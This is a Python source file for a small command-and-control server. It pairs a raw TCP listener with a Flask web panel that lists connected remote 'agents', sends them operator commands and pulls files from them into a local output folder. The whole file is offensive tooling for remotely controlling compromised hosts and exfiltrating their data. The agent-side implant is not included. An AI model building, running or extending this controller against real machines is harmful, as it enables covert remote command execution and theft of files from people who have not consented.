import socket
import threading
import time
import flask
from flask import *
import os

ip = '127.0.0.1'
port = 6666

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPS = []
active_connections = 0

app = Flask(__name__)

for i in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')

def handle_conn(connection, address, thread_index):
    global CMD_INPUT
    global CMD_OUTPUT
    global active_connections
    active_connections += 1
    while CMD_INPUT[thread_index] != 'quit':
        msg = connection.recv(2048).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index] != '':
                if CMD_INPUT[thread_index].split(" ")[0] == 'download':
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    
                    # Check if the file exists on the agent side
                    agent_response = connection.recv(2048).decode()
                    if agent_response.startswith("Error"):
                        CMD_OUTPUT[thread_index] = agent_response
                        CMD_INPUT[thread_index] = ''
                    else:
                        contents = agent_response.encode()
                        # Check if the directory exists, if not, create it
                        if not os.path.exists('output'):
                            os.makedirs('output')
                        f = open(os.path.join('output', filename), 'wb')
                        f.write(contents)
                        f.close()
                        CMD_OUTPUT[thread_index] = 'File Transfer Successful.'
                        CMD_INPUT[thread_index] = ''
                   
                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    CMD_INPUT[thread_index] = ''
                    break
                
    active_connections -= 1
    connection_sakkaune(connection)


def connection_sakkaune(connection):
    connection.close()

def server_socket():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip, port))
    ss.listen(5)
    global THREADS
    global IPS
    print(f"Server listening on {ip}:{port}")

    while True:
        connection, address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_conn, args=(connection, address, thread_index))
        THREADS.append(t)
        IPS.append(address)
        print(f"Active connections: {active_connections}")
        t.start()

@app.before_request
def before_request():
    s1 = threading.Thread(target=server_socket)
    s1.start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/tcpagents')
def tcpagentsagents():
    return render_template('agents.html', threads=THREADS, ips=IPS)

@app.route('/httpagents')
def httpagents():
    return render_template('agents.html', threads=THREADS, ips=IPS)

@app.route('/<agentname>/executecmd')
def executecmd(agentname):
    return render_template("execute.html", name=agentname)

@app.route('/<agentname>/execute', methods=['GET', 'POST'])
def execute(agentname):
    if request.method == 'POST':
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
                CMD_INPUT[req_index] = cmd
                time.sleep(1)
                cmdoutput = CMD_OUTPUT[req_index]
                return render_template("execute.html", cmdoutput=cmdoutput, name=agentname)

if __name__ == '__main__':
    app.run(debug=True, port=5001)
